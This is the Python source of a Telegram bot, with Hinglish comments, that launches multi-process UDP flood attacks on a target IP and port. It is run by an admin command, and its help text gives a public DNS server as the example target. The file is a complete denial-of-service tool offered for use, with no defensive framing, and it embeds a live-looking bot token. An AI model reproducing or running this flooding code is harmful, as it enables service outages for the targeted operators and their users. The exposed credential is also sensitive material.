import logging
import socket
import time
import random
import multiprocessing as mp
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

stop_flags = {}
active_attacks = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **Pure Power UDP Flood** - Tuning ke baad try kar!")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **Commands**\n\n"
        "`/attack <ip> <port> <duration> <processes>`\n"
        "Example: `/attack 8.8.8.8 53 60 64`\n"
        "(64 processes best for 16 cores)\n\n"
        "/stopattack\n/status",
        parse_mode='Markdown'
    )

def attack_worker(ip, port, duration, stop_event, worker_id):
    packets = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)  # 16MB
        sock.setblocking(False)

        end_time = time.time() + duration
        payload = b"POWER_ATTACK_" + str(worker_id).encode() + b"_" * 900  # ~1024 bytes

        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                packets += 1
                if packets % 5000 == 0:
                    time.sleep(0.00001)  # bahut chhota pause
            except BlockingIOError:
                time.sleep(0.0003)
            except:
                time.sleep(0.001)
        sock.close()
    except Exception as e:
        logger.error(f"Worker {worker_id} error: {e}")
    return packets

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 4:
        await update.message.reply_text("Usage: `/attack <ip> <port> <duration> <processes>`", parse_mode='Markdown')
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])
    num_proc = min(int(context.args[3]), 128)   # safety + performance

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = mp.Event()
    stop_flags[attack_id] = stop_event

    msg = await update.message.reply_text(
        f"⚔️ **ATTACK STARTED**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: `{duration}s`\n"
        f"Processes: `{num_proc}`\n"
        f"After kernel tuning — packets should fly now!",
        parse_mode='Markdown'
    )

    processes = []
    for i in range(num_proc):
        p = mp.Process(target=attack_worker, args=(ip, port, duration, stop_event, i), daemon=True)
        p.start()
        processes.append(p)

    active_attacks[attack_id] = processes

    await asyncio.sleep(duration)
    stop_event.set()

    for p in processes:
        if p.is_alive():
            p.join(timeout=3)

    await msg.edit_text(
        f"✅ **Attack Done**\n"
        f"Target: `{ip}:{port}`\n"
        f"Processes: `{num_proc}`\n"
        f"Check with `iftop` or `nethogs` on server — traffic badhna chahiye ab"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 All attacks stopped.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))

    print("🔥 Pure Power Bot Running - Pehle kernel tuning kar!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
